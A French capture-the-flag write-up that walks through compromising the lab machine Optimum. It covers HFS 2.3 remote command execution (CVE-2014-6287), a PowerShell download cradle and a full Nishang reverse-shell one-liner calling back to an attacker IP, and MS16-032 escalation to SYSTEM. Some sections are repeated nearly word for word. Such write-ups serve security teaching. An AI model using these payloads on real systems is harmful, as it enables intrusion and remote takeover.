![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

#### 1. Scanning et Énumération de Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque. L'objectif est de découvrir les ports ouverts et les versions des services associés.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.8

# Scan ciblé avec scripts par défaut et détection de version
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.8
```

Le scan révèle un unique point d'entrée :
*   **Port 80/TCP** : Service **HttpFileServer (HFS) httpd 2.3**.

L'en-tête HTTP confirme l'utilisation de **Rejetto HFS version 2.3**, un logiciel de partage de fichiers souvent vulnérable dans ses anciennes versions. Le système d'exploitation est identifié comme étant **Windows**.

#### 2. Identification du Vecteur d'Entrée

Une recherche via **searchsploit** pour "HttpFileServer 2.3" pointe immédiatement vers une vulnérabilité critique de **Remote Command Execution (RCE)**.

*   **Vulnérabilité** : **CVE-2014-6287**.
*   **Type** : Injection de macros via le paramètre `search`.
*   **Mécanisme** : Le logiciel échoue à filtrer correctement les caractères nuls (`%00`) dans l'URL, permettant d'exécuter des commandes système via la directive `{.exec|... .}`.

> **Schéma Mental : Chaîne d'Exploitation RCE**
> `Requête HTTP GET` -> `Paramètre ?search=%00` -> `Bypass du filtre` -> `Exécution de macro HFS` -> `Appel à cmd.exe` -> `Payload arbitraire`

#### 3. Preuve de Concept (PoC) et Analyse

Avant de tenter un **Reverse Shell**, je vérifie l'exécution de commandes en forçant la cible à émettre un **ICMP Echo Request** (ping) vers ma machine d'attaque.

```bash
# Préparation de l'écoute ICMP
sudo tcpdump -i tun0 icmp

# Payload URL-encodé pour le test
http://10.10.10.8/?search=%00{.exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}
```

La réception des paquets ICMP confirme que la **RCE** est fonctionnelle. Je note que l'utilisation de `cmd.exe /c` est nécessaire pour garantir l'exécution dans l'environnement du service.

#### 4. Obtention du Premier Shell

Pour obtenir un accès interactif, j'utilise un **PowerShell One-Liner** issu du framework **Nishang** (`Invoke-PowerShellTcpOneLine.ps1`). 

**Étapes de l'attaque :**
1.  Hébergement du script `rev.ps1` sur mon serveur local.
2.  Utilisation d'un **PowerShell Cradle** via la **RCE** pour télécharger et exécuter le script en mémoire (**Fileless**).

```powershell
# Contenu de rev.ps1 (Nishang)
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|% {0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Exécution de la brèche :**

```bash
# Lancement du serveur HTTP et du listener
sudo python3 -m http.server 80
sudo rlwrap nc -lnvp 443

# Payload final envoyé via le navigateur ou curl
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}
```

La connexion est établie avec succès. Je récupère un shell en tant qu'utilisateur **optimum\kostas**.

#### 5. Analyse de l'Architecture

Une vérification immédiate de l'architecture du processus est cruciale sur Windows pour les phases ultérieures :

```powershell
[Environment]::Is64BitProcess
# Retourne : False
```

Bien que l'OS soit un **Windows Server 2012 R2 (x64)**, mon shell actuel tourne dans un processus **32-bit (x86)** car le service **HFS** est lui-même en 32-bit. Cette information est capitale : pour exploiter des vulnérabilités de noyau (Kernel exploits) sur un système 64-bit, je devrai impérativement migrer vers un processus 64-bit ou appeler directement le binaire **PowerShell** situé dans `C:\Windows\SysNative\`.

---

### Énumération Post-Exploitation

Une fois le premier accès obtenu en tant que **kostas**, mon objectif est d'identifier des vecteurs d'élévation de privilèges. Sur une machine Windows de cet âge (2017), je privilégie l'énumération des vulnérabilités de **Kernel**.

J'utilise d'abord **winPEAS** pour obtenir une vue d'ensemble du système.

```powershell
# Transfert de winPEAS via SMB
copy \\10.10.14.10\share\winPEAS.exe .
.\winPEAS.exe
```

L'output confirme que nous sommes sur un **Windows Server 2012 R2 Standard** (64-bit). Bien que **winPEAS** trouve des identifiants **AutoLogon** pour `kostas` (`kdeEjDowkS*`), ils ne permettent pas une progression directe vers un compte plus privilégié.

Pour l'énumération spécifique aux **Kernel Exploits**, je tente d'utiliser **Watson**. Cependant, l'outil échoue car il requiert **.NET 4.5**, alors que la cible ne dispose que de la version **4.0**. Je pivote donc vers **Sherlock**, un prédécesseur basé sur **PowerShell**.

```powershell
# Exécution de Sherlock en mémoire via un IEX (Invoke-Expression)
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
```

**Sherlock** identifie trois vulnérabilités potentielles :
*   **MS16-032** (Secondary Logon Handle)
*   **MS16-034** (Windows Kernel-Mode Drivers)
*   **MS16-135** (Win32k Elevation of Privilege)

> **Schéma Mental :** 
> Accès Initial (`kostas`) -> Échec des outils récents (**Watson**/.NET incompatibility) -> Utilisation de scripts legacy (**Sherlock**) -> Identification de failles **Kernel**.

---

### Analyse de l'Architecture et Pivot 64-bit

Un point critique lors de l'exploitation de **Kernel Exploits** sur Windows est l'adéquation entre l'architecture du processus de l'exploit et celle du système d'exploitation. 

Mon **Reverse Shell** initial provient du processus `hfs.exe`, qui est une application **32-bit**. Par conséquent, mon instance **PowerShell** tourne en mode **32-bit** (WoW64), ce qui fait échouer la plupart des exploits ciblant un noyau **64-bit**.

Je vérifie l'architecture du processus actuel :
```powershell
[Environment]::Is64BitProcess
# Retourne : False
```

Pour contourner la redirection automatique vers `System32` (qui contient les binaires 32-bit dans ce contexte), je dois appeler explicitement le binaire **PowerShell** 64-bit via le chemin virtuel **SysNative**.

```bash
# Payload pour obtenir un shell 64-bit
/?search=%00{.exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.10/rev.ps1').}
```

Une fois le nouveau shell reçu, je confirme le passage en **64-bit** :
```powershell
[Environment]::Is64BitProcess
# Retourne : True
```

---

### Élévation de Privilèges : MS16-032

Je choisis d'exploiter la vulnérabilité **MS16-032** (**CVE-2016-0099**). Cette faille réside dans le service **Secondary Logon** qui ne vérifie pas correctement les handles de thread lors du lancement de processus avec des privilèges différents.

J'utilise une version modifiée du script **Invoke-MS16032.ps1** issue du projet **Empire**, car elle permet de passer une commande personnalisée au lieu de simplement tenter de lancer une fenêtre interactive.

```powershell
# Préparation du script avec l'appel de fonction à la fin
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"
```

J'héberge le script sur mon serveur HTTP et je l'exécute depuis mon shell **64-bit** :

```powershell
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
```

> **Schéma Mental :**
> Shell 32-bit (Incompatible) -> **SysNative** Redirection -> Shell 64-bit -> **MS16-032** Exploit -> **Handle Leak** -> Exécution de payload en tant que **SYSTEM**.

L'exploit réussit, déclenche un nouveau téléchargement de mon script de **Reverse Shell** et m'offre une session avec les privilèges les plus élevés.

```bash
# Réception du shell final
whoami
nt authority\system
```

---

### Énumération Post-Exploitation

Une fois mon accès initial établi en tant que **kostas**, je débute l'énumération du système pour identifier des vecteurs d'**Elevation of Privileges (EoP)**. Le système est un **Windows Server 2012 R2** (Architecture **AMD64**). 

J'utilise d'abord **winPEAS.exe** transféré via un partage **SMB**. Bien que l'outil identifie des **AutoLogon credentials** pour l'utilisateur **kostas** (`kdeEjDowkS*`), ces derniers ne permettent pas une élévation directe vers **SYSTEM**. Je me tourne alors vers l'énumération des vulnérabilités de **Kernel**. Comme **Watson** échoue en raison d'une version de **.NET Framework** incompatible (v4.0 installée, v4.5 requise), j'utilise son prédécesseur : **Sherlock.ps1**.

```powershell
# Exécution de Sherlock via un PowerShell Cradle
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
```

**Sherlock** identifie trois vulnérabilités potentielles : **MS16-032**, **MS16-034**, et **MS16-135**.

---

### Le Piège de l'Architecture (32-bit vs 64-bit)

Mes premières tentatives d'exploitation échouent systématiquement. En vérifiant l'environnement, je réalise que mon **Reverse Shell** tourne dans un processus 32-bit, bien que l'OS soit en 64-bit. Cela est dû au fait que le service vulnérable (**HFS**) est une application 32-bit.

> **Schéma Mental : Redirection de Système de Fichiers**
> Sur un Windows 64-bit, un processus 32-bit appelant `C:\Windows\System32` est redirigé de manière transparente vers `C:\Windows\SysWOW64`. Pour exécuter des exploits **Kernel** 64-bit, je dois impérativement forcer l'utilisation d'un binaire 64-bit en utilisant l'alias **SysNative**.

Pour obtenir un shell 64-bit stable, je relance mon exploit initial en ciblant spécifiquement le binaire **PowerShell** 64-bit :

```bash
# Payload pour forcer un shell 64-bit
/?search=%00{.exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/rev.ps1').}
```

Vérification de l'architecture dans le nouveau shell :
```powershell
[Environment]::Is64BitProcess
# Output: True
```

---

### Exploitation de MS16-032 (Secondary Logon Handle)

Je choisis l'exploit **MS16-032** (vulnérabilité du service **Secondary Logon**). La version publique d'**Exploit-DB** tente d'ouvrir une fenêtre graphique, ce qui est inutile sur un shell distant. J'utilise donc la version modifiée du projet **Empire** qui permet de passer une commande spécifique.

> **Schéma Mental : MS16-032**
> La vulnérabilité réside dans la manière dont le service **Secondary Logon** gère les **Handles** de threads. En exploitant un **Race Condition** et une corruption de mémoire, on peut forcer le système à copier un **Access Token** de niveau **SYSTEM** vers un processus contrôlé par l'attaquant.

```powershell
# Préparation de l'exploit (ajout de l'appel à la fin du script .ps1)
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"

# Exécution depuis le shell 64-bit
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
```

L'exploit déclenche un nouveau callback vers mon listener **Netcat**, m'octroyant les privilèges **nt authority\system**.

---

### Beyond Root : Analyse Post-Exploitation

La compromission totale d'**Optimum** met en lumière deux points critiques souvent rencontrés en environnement réel :

1.  **Gestion des correctifs (Patch Management) :** Le serveur tournait sur une version de **Windows Server 2012 R2** non patchée contre des vulnérabilités critiques de 2016. Dans un environnement durci, l'activation de **Windows Update** ou l'utilisation de **WSUS** aurait mitigé les vecteurs **MS16-032/034/135**.
2.  **Architecture Context Awareness :** L'échec initial de l'élévation souligne l'importance de la distinction entre l'architecture de l'OS et l'architecture du processus compromis. Un attaquant doit toujours vérifier `Is64BitProcess` avant de déployer un exploit **Kernel**, car les structures de données mémoire (comme la **GDT** ou la **LDT**) diffèrent radicalement.
3.  **Alternative d'exploitation :** Outre le **Kernel Exploit**, la présence de credentials en clair dans la configuration d'**AutoLogon** (trouvés par **winPEAS**) aurait pu permettre un mouvement latéral ou une persistance via **RunAs** si l'utilisateur avait eu des privilèges plus élevés sur d'autres machines du domaine.